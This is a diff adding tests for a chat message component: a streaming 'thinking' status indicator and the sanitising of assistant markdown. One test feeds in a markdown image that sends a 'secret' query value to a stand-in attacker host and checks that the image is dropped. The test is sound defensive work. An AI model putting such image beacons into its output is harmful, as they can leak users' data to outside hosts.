@@ -133,11 +133,63 @@ describe("ChatMessage markdown", () => {
     expect(document.querySelector("img[onerror]")).toBeNull();
   });
 
+  it("shows a labelled thinking indicator before the first token arrives", () => {
+    render(
+      <ChatMessage message={{ id: "m1", role: "assistant", content: "", streaming: true }} />,
+    );
+
+    const status = screen.getByRole("status");
+    expect(status).toHaveTextContent(/searching/i);
+  });
+
+  it("says it is writing the answer once sources have arrived", () => {
+    render(
+      <ChatMessage
+        message={{
+          id: "m1",
+          role: "assistant",
+          content: "",
+          streaming: true,
+          sources: [source(1)],
+        }}
+      />,
+    );
+
+    expect(screen.getByRole("status")).toHaveTextContent(/writing/i);
+  });
+
+  it("replaces the thinking indicator with the answer once text streams in", () => {
+    render(
+      <ChatMessage
+        message={{ id: "m1", role: "assistant", content: "Partial answer", streaming: true }}
+      />,
+    );
+
+    expect(screen.queryByRole("status")).not.toBeInTheDocument();
+    expect(screen.getByText("Partial answer")).toBeInTheDocument();
+  });
+
+  it("shows no thinking indicator on a finished message", () => {
+    render(<ChatMessage message={assistantMessage("Done.", [])} />);
+
+    expect(screen.queryByRole("status")).not.toBeInTheDocument();
+  });
+
   it("does not render markdown for user messages", () => {
     render(<ChatMessage message={{ id: "u1", role: "user", content: "# not a heading" }} />);
 
     expect(screen.queryByRole("heading")).not.toBeInTheDocument();
     expect(screen.getByText("# not a heading")).toBeInTheDocument();
+  });
+
+  it("drops images from assistant markdown", () => {
+    render(
+      <ChatMessage
+        message={assistantMessage("![beacon](https://evil.example.com/p.png?leak=secret)", [])}
+      />,
+    );
+
+    expect(document.querySelector("img")).toBeNull();
   });
 
   it("escapes snippet text used in the citation tooltip", () => {
